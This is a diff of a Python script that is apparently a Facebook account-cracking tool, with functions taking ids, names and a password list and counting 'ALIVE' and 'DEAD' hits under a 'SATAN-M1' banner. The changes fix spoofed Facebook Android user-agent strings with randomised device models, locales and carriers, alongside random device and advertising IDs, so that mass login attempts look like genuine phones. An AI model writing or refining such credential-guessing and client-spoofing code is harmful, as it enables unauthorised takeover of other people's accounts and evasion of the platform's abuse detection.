@@ -306,7 +306,7 @@ def api(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/th_TH;FBRV/{str(application_version_code)};FBCR/AIS;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)}FBDV/{str(gtt)};FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -363,7 +363,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global loop,oks,cps
-                        sys.stdout.write(f'\r\033[1;96m [RIZEL M1] %s \033[1;32m[ALIVE ➠ %s] \033[1;31m[DEAD ➠ %s] '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -377,7 +377,7 @@ def api1(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/th_TH;FBRV/{str(application_version_code)};FBCR/AIS;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)}FBDV/{str(gtt)};FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
